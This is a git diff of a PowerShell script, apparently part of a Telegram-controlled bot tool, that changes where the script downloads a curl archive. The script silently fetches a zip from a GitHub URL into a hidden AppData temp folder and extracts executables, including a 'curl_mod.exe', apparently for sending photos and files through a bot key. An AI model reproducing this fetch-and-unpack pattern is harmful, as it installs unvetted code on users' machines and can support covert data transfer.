@@ -34,11 +34,11 @@ param ($photo,$file,$botkey,$chat_id)
 
 $proxy = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').proxyServer
 $ruta = $env:USERPROFILE + "\appdata\local\temp\1"
-$curl_zip = $ruta + "\curl_752_1.zip"
+$curl_zip = $ruta + "\curl.zip"
 $curl = $ruta + "\" + "curl.exe"
 $curl_mod = $ruta + "\" + "curl_mod.exe"
 if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
-if ( (Test-Path $curl_mod) -eq $false ) {$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("http://www.paehl.com/open_source/?download=curl_752_1_ssl.zip","$curl_zip")
+if ( (Test-Path $curl_mod) -eq $false ) {$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("https://raw.githubusercontent.com/cybervaca/psbotelegram/master/Funciones/curl.zip","$curl_zip")
 [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null
 [System.IO.Compression.ZipFile]::ExtractToDirectory("$curl_zip","$ruta") | Out-Null
 
